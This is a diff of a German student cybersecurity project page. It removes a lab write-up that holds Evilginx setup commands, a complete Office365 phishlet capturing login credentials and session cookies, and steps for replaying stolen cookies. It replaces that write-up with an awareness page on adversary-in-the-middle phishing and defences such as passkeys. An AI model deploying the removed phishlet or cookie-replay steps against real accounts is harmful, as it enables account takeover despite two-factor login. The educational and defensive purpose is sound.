@@ -1,252 +1,85 @@
-# Phishing Awareness Forschungsprojekt - Technische Dokumentation
-
-## Projekthintergrund und Zielsetzung
-
-### Forschungsziel
-Dieses Projekt dient der technischen Erforschung von Phishing-Technologien im kontrollierten Laboreinsatz. Der Fokus liegt auf dem Aufbau der technischen Infrastruktur und dem Verständnis moderner Angriffsmethoden.
-
-### Aktueller Projektstatus
-Phase 1: Technische Infrastruktur - Abgeschlossen  
-Phase 2: Phishlet Entwicklung - Abgeschlossen  
-Phase 3: Testing & Validierung - In Arbeit  
-Phase 4: Kampagnen - Noch nicht begonnen  
-
-## Technische Infrastruktur
-
-### Server-Konfiguration
-```bash
-# Betriebssystem: Ubuntu Server 22.04 LTS
-# Virtualisierung: Lokale VM / Cloud Instance
-# Spezifikation: 2 vCPU, 4GB RAM, 50GB Storage
-
-# Basis-Setup Commands:
-sudo apt update && sudo apt upgrade -y
-sudo apt install -y git make build-essential net-tools
-```
-
-### Netzwerk-Architektur
-Lokale Testumgebung:
-Domain: lab.test (lokale Entwicklung)
-Subdomains:
-  - login.lab.test
-  - account.lab.test
-
-## Evilginx Installation und Konfiguration
-
-### Go Installation
-```bash
-# Go 1.21.0 installieren
-wget https://go.dev/dl/go1.21.0.linux-amd64.tar.gz
-sudo rm -rf /usr/local/go && sudo tar -C /usr/local -xzf go1.21.0.linux-amd64.tar.gz
-
-# PATH Variable setzen
-echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
-source ~/.bashrc
-
-# Installation verifizieren
-go version
-```
-
-### Evilginx Build Process
-```bash
-# Repository klonen
-git clone https://github.com/kgretzky/evilginx2.git
-cd evilginx2
-
-# Binary kompilieren
-make
-
-# Ersten Start durchführen
-./evilginx
-```
-
-### Firewall Konfiguration
-```bash
-# UFW Firewall einrichten
-sudo ufw enable
-sudo ufw allow 22/tcp    # SSH
-sudo ufw allow 80/tcp    # HTTP
-sudo ufw allow 443/tcp   # HTTPS
-
-# IPTables für Port Redirect
-sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
-sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8443
-```
-
-## Phishlet Entwicklung - Microsoft 365
-
-### Komplettes Phishlet: office365.yaml
-```yaml
-name: "office365"
-author: "Research Team"
-min_ver: "3.0"
-
-proxy_hosts:
-  - {phish_sub: "login", orig_sub: "login", domain: "microsoftonline.com", session: true, is_landing: false}
-  - {phish_sub: "account", orig_sub: "account", domain: "microsoftonline.com", session: true, is_landing: false}
-
-sub_filters:
-  - {hostname: "login.microsoftonline.com", sub: "login", domain: "microsoftonline.com", search: "login.microsoftonline.com", replace: "login.lab.test", mimes: ["text/html", "application/javascript", "text/css"]}
-  - {hostname: "account.microsoftonline.com", sub: "account", domain: "microsoftonline.com", search: "account.microsoftonline.com", replace: "account.lab.test", mimes: ["text/html", "application/javascript", "text/css"]}
-
-auth_tokens:
-  - domain: ".login.microsoftonline.com"
-    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "SignInStateCookie"]
-
-login:
-  domain: "login.microsoftonline.com"
-  path: "/common/oauth2/authorize"
-
-credentials:
-  username:
-    key: "loginfmt"
-    search: "name=\"loginfmt\""
-    type: "form"
-  password:
-    key: "passwd" 
-    search: "name=\"passwd\""
-    type: "form"
-```
-
-### Phishlet Aktivierung
-```bash
-# Phishlet in Evilginx laden
-./evilginx
-
-# In Evilginx Console:
-phishlets hostname office365 login.lab.test
-phishlets enable office365
-
-# Status überprüfen
-phishlets list
-```
-
-## DNS Konfiguration für lokales Testing
-
-### Hosts Datei Konfiguration
-```bash
-# Lokale /etc/hosts Einträge
-echo "127.0.0.1 login.lab.test" | sudo tee -a /etc/hosts
-echo "127.0.0.1 account.lab.test" | sudo tee -a /etc/hosts
-```
-
-## Technisches Testing und Validierung
-
-### Manueller Testablauf
-1. Lokalen Zugriff testen
-   - Browser öffnen: https://login.lab.test
-   - Evilginx leitet zu echtem Microsoft Login weiter
-
-2. Session Capture testen
-   - Mit Test-Account anmelden
-   - Session Cookies werden von Evilginx erfasst
-
-3. Cookie Export validieren
-   - Struktur und Inhalte prüfen
-
-## Session Hijacking Forschung
-
-### Cookie Import Challenge
-Technisches Problem: Browser Security Policies
-```javascript
-// Cross-Domain Cookie Setting nicht erlaubt
-document.cookie = "ESTSAUTH=...; domain=.login.microsoftonline.com"
-// Error: Failed to set cookie - Cross-domain setting not allowed
-```
-
-### Erfolgreicher Workaround
-1. Browser Extension Methode
-   - "Cookie-Editor" Extension installieren
-   - Immer inkognito fenster nutzen und sich immer abmelden
-  
-2. Vorbereitungsschritte
-   ```bash
-   # Bestehende Cookies löschen
-   # Browser Cache leeren
-   # Von Accounts abmelden
-   # Browser neustarten
-   ```
-
-3. Import-Prozess
-   - Zu https://login.microsoftonline.com navigieren
-   - Cookie-Editor öffnen
-   - Cookies importieren
-   - Seite neu laden
-
-
-## Bisherige technische Erkenntnisse
-
-### Evilginx Funktionalität
-- Reverse Proxy funktioniert korrekt
-- Domain-Filtering arbeitet wie erwartet
-- Session Capture ist erfolgreich
-- Cookie Export im JSON-Format funktioniert
-
-### Microsoft Auth Flow Analyse
-- ESTSAUTH: Primäres Session Token
-- ESTSAUTHPERSISTENT: Persistentes Auth Token  
-- SignInStateCookie: Login State Management
-- Expiration: Standard 24-48 Stunden
-
-### Technische Hürden
-1. Cookie Import Restrictions
-   - Same-Origin Policy des Browsers
-   - HttpOnly Flags schützen vor XSS
-   - Secure Flag erzwingt HTTPS
-
-2. Session Validation
-   - IP-basierte Sicherheitsmechanismen
-   - Device Fingerprinting
-   - Time-based Token Validation
-
-## Sicherheitsmaßnahmen im Laboreinsatz
-
-### Testumgebung Safeguards
-```bash
-# Isolierte Laborumgebung
-# Keine Produktivdaten
-```
-
-### Ethische Richtlinien
-- Nur eigene Test-Accounts
-- Isolierte Laborumgebung
-- Keine externen Teilnehmer
-- Forschungszwecke ausschließlich
-
-## Nächste Schritte im Projekt
-
-### Phase 4: Zukünftige Entwicklung
-- Weitere Phishlets entwickeln (Google, GitHub)
-- Automatisierte Testing Pipeline
-- Defense Techniques Entwicklung
-
-### Technische Forschungsfragen
-1. Wie können Session Cookies besser geschützt werden?
-2. Wie kann Awareness training verbessert werden?
-
-## Dokumentation der Testfälle
-
-### Durchgeführte Tests
-Testfall | Status | Ergebnis
----------|--------|----------
-Evilginx Installation | Erfolg | System läuft stabil
-Phishlet Entwicklung | Erfolg | Office365 Phishlet funktional
-Local DNS Setup | Erfolg | Subdomain Routing korrekt
-Session Capture | Erfolg | Cookies werden erfasst
-Cookie Export | Erfolg | JSON Format korrekt
-Cookie Import | Teilweise | Technische Limitationen
-
-### Bekannte Limitationen
-1. Lokale Testumgebung - Keine externen Zugriffe
-2. Cookie Reuse - Eingeschränkt durch Browser Policies  
-3. Scale - Derzeit nur Einzelnutzer-Testing
-
+---
+title: AITM Schutzprojekt | Cybersecurity
+theme: jekyll-theme-minimal
 ---
 
-Projektstand: Technische Infrastruktur aufgebaut - Grundlagenforschung  
-Letztes Update: $(date +%Y-%m-%d)  
-Nächste Meilensteine: Erweiterte Session Analysis, Detektion Research
+# AITM Schutzprojekt | Maturaprojekt Cybersecurity
 
----
+**Achtung: Ihr 2FA-Code ist möglicherweise nicht mehr sicher.**
 
-Diese Forschung dient ausschließlich dem technischen Verständnis von Phishing-Mechanismen und der Entwicklung verbesserter Schutzmaßnahmen. Alle Tests finden in vollständig isolierten Laborumgebungen statt.
+## Der unsichtbare Angreifer
+
+Adversary-in-The-Middle (AITM) Angriffe umgehen moderne Sicherheitsstandards in Echtzeit. Diese Seite erklärt, wie sie funktionieren und wie Sie sich verteidigen können.
+
+## 1. Was ist ein AITM-Angriff?
+
+Ein Adversary-in-The-Middle-Angriff (oft auch "Man-in-the-Middle" genannt) ist eine hochentwickelte Form des Phishings.
+
+Anders als bei klassischem Phishing, wo Daten auf einer statischen Fake-Seite gesammelt werden, klinkt sich der Angreifer live in die Kommunikation zwischen Ihnen und dem Dienst (z.B. Microsoft 365 oder Google) ein.
+
+### Der Unterschied
+
+| Merkmal | Klassisches Phishing | AITM Angriff (Phishing 2.0) |
+|---------|---------------------|-----------------------------|
+| **Ziel** | Passwort stehlen | Aktive Sitzung (Cookie) stehlen |
+| **Ablauf** | Statische Fake-Seite | Live-Proxy (Echtzeit-Weiterleitung) |
+| **2FA-Schutz** | Blockiert den Angreifer oft | Wird live umgangen |
+| **Gefahr** | Mittel | **Extrem Hoch** |
+
+## 2. Wie funktioniert es? (Der Ablauf einfach erklärt)
+
+Stellen Sie sich vor, der Angreifer sitzt wie ein Postbote in der Mitte zwischen Ihnen und der echten Webseite. Er fängt Ihre Briefe ab, liest sie, schreibt sich wichtige Informationen auf und schickt sie dann weiter – so schnell, dass Sie nichts davon merken.
+
+**So läuft ein AITM-Angriff ab:**
+
+### Schritt 1: Der falsche Köder
+Der Angreifer schickt Ihnen eine E-Mail mit einem Link zu einer Login-Seite. Diese Seite sieht absolut echt aus und verhält sich auch so, aber in Wirklichkeit gehört sie dem Angreifer. Sie ist nur ein "Fenster" zu seinem Server.
+
+### Schritt 2: Die Live-Weiterleitung Ihrer Daten
+Sie geben Ihre Zugangsdaten (Benutzername und Passwort) auf dieser gefälschten Seite ein. Der Angreifer fängt diese Daten sofort ab und leitet sie in Echtzeit an die echte Webseite weiter.
+
+### Schritt 3: Die Umgehung des 2FA
+Die echte Webseite sendet als Antwort eine Aufforderung für Ihren 2FA-Code (z.B. per SMS oder Authenticator-App). Auch diese Anforderung wird vom Angreifer abgefangen und Ihnen über seine gefälschte Seite angezeigt. Sie geben den 2FA-Code ein, und der Angreifer leitet auch diesen sofort an die echte Webseite weiter.
+
+### Schritt 4: Der Diebstahl Ihrer digitalen "Eintrittskarte"
+Nach erfolgreichem Login sendet die echte Webseite ein "Session Cookie" zurück. Dieses Cookie ist wie eine digitale Eintrittskarte, die beweist, dass Sie eingeloggt sind. Der Angreifer fängt auch dieses Cookie ab und speichert es.
+
+**Das Ergebnis:** Der Angreifer besitzt nun Ihr Session Cookie. Er kann sich mit dieser "Eintrittskarte" auf der echten Webseite als Sie ausgeben, ohne Ihr Passwort oder Ihren 2FA-Code erneut eingeben zu müssen. Für Sie sieht es aus, als hätten Sie sich ganz normal eingeloggt.
+
+## 3. Warum 2FA nicht mehr ausreicht
+
+Viele Nutzer fühlen sich sicher, weil sie einen Code per SMS oder App bekommen. Das ist ein Trugschluss.
+
+- **Session-Übernahme:** Traditionelles 2FA schützt nur den Login-Prozess, nicht die Sitzung danach.
+- **Automatisierung:** Angreifer nutzen Tools (wie Evilginx), die diesen Prozess vollautomatisch in Millisekunden abwickeln.
+- **Massenware:** Solche Angriffs-Kits sind billig verfügbar. Es braucht keinen Profi-Hacker mehr.
+- **Statistik:** Erfolgreiche AITM-Kampagnen haben eine Erfolgsquote von bis zu 90%, selbst bei aktivierter Multi-Faktor-Authentifizierung.
+
+## 4. Wie schützen wir uns?
+
+Technologie muss Phishing-resistent werden. Hier sind die einzigen wirksamen Gegenmaßnahmen:
+
+### 1. Passkeys und FIDO2 (Empfohlen)
+Die sicherste Methode. Passkeys basieren auf Kryptographie. Der Login funktioniert technisch nur, wenn die URL der echten Webseite zu 100% stimmt.
+
+*Beispiel: FaceID Login bei Google, TouchID bei Microsoft.*
+
+### 2. Hardware Security Keys
+Geräte wie YubiKeys erfordern eine physische Berührung. Ein Hacker in einem anderen Land kann den Stick an Ihrem Schlüsselbund nicht drücken.
+
+### 3. Verhaltensbewusstsein
+- Prüfen Sie die URL genau (ist es microsoft-login-secure.com statt microsoft.com?).
+- Seien Sie misstrauisch bei Dringlichkeit ("Ihr Konto wird sofort gesperrt!").
+
+## Sicherheits-Checkliste
+
+Kopieren Sie diese Liste und prüfen Sie Ihre Accounts:
+
+- [ ] **Passkeys aktivieren:** Wo immer möglich (Google, Apple, Amazon, etc.).
+- [ ] **SMS-2FA deaktivieren:** Dies ist die unsicherste Methode.
+- [ ] **Authenticator-App nutzen:** Steigen Sie auf Microsoft Authenticator oder Google Authenticator um.
+- [ ] **Sitzungen prüfen:** Schauen Sie in den Einstellungen unter "Aktive Geräte" nach Unbekannten.
+
+<footer>
+<small>@ 2025 Maturaprojekt Cybersecurity. Nur für Bildungszwecke.</small>
+</footer>
